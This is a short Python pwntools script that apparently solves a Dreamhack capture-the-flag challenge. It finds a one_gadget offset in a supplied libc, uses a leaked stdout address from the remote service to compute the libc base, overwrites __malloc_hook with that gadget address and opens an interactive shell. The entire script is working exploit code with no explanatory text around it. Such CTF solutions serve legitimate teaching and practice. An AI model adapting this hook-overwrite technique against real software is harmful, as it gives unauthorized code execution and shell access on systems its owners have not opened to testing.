from pwn import *


def main():
    proc = process(["one_gadget", "./libc.so.6"])
    for _ in range(8):
        proc.recvline()
    one_gadget = proc.recvline().decode()
    one_gadget = one_gadget[one_gadget.find("0x")+2:]
    one_gadget = one_gadget[:one_gadget.find("\x1b")]
    one_gadget = int(one_gadget, 16)
    proc.close()

    libc = ELF("./libc.so.6", checksec=False);
    libc_stdout_offset = libc.symbols["_IO_2_1_stdout_"]
    libc_hook_offset = libc.symbols["__malloc_hook"]

    proc = remote("host1.dreamhack.games", 17555)
    proc.recvuntil(b"stdout: ")
    stdout_addr = proc.recvline(False).decode()
    stdout_addr = int(stdout_addr, 16)

    libc_base = stdout_addr - libc_stdout_offset

    payload = p64(libc_base+libc_hook_offset)
    payload += p64(libc_base+one_gadget)

    proc.sendlineafter(b"Size: ", str(len(payload)).encode())
    proc.sendafter(b"Data: ", payload)
    proc.interactive()

if __name__ == "__main__":
    main()
